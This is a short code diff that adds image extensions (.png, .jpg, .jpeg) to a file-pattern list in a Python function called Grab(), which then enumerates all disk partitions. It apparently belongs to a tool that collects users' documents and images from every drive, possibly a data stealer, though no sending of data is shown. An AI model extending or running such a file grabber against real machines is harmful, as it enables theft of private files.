@@ -53,6 +53,9 @@ def Grab():
                 ["**\*.docx", 0],
                 ["**\*.csv", 0],
                 ["**\*.xls", 0],
+                ["**\*.png", 0],
+                ["**\*.jpg", 0],
+                ["**\*.jpeg", 0],
             ]
 
             drives = disk_partitions()
